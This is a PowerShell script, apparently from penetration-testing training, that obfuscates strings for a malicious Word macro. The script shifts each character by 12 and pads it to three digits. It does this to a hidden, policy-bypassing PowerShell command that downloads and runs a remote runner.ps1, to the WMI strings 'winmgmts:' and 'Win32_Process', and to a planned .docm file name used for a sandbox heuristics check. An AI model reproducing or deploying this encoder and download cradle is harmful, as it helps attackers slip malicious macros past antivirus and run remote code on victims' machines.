$payload = "powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.228/runner.ps1')"
"Apples - powershell code runner"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
# Win32 WMI Provider
$output
"`r`nWin32 WMI Provider (winmgmts:)"
$payload = "winmgmts:"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
# Win32 Process.Create() method
$output
"`r`nWin32_Process.Create() Method value"
$payload = "Win32_Process"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
# planned word doc name, for heuristics check during runtime
$output
"`r`nName of docm"
$payload = "107111.docm"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output